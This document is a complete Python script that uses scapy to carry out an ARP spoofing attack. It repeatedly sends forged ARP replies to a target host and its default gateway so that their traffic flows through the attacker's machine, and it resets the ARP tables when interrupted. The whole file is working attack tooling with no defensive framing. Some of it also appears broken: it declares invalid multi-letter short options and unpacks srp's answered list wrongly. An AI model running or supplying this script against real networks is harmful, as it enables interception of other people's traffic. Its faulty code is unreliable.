#!/usr/bin/env python
import time
import optparse
import scapy.all as scapy

def get_ip_addrs():
    parser = optparse.OptionParser()

    parser.add_option("-tip", "--targetip", dest="target_ip", help="Target IP Address To Spoof")
    parser.add_option("-gip", "--gatewayip", dest="gateway_ip", help="Default Gateway Address")

    (options, arguments) = parser.parse_args()

    if not options.target_ip:
        # code to handle error
        parser.error("[-] Please specify a valid target ip, use --help for more information.")

    elif not options.gateway_ip:
        # code to handle error
        parser.error("[-] Please specify a default gateway, use --help for more information.")
    return options

def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    scapy.ls(scapy.Ether())

    arp_request_broadcast = broadcast/arp_request
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=get_mac(dest_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
    scapy.send(packet, count=4, verbose=False)

options = get_ip_addrs()
target_ip = options.target_ip
gateway_ip = options.gateway_ip
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count+=2
        print("\r[+] Packets Sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ....... Resetting ARP Tables-- Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
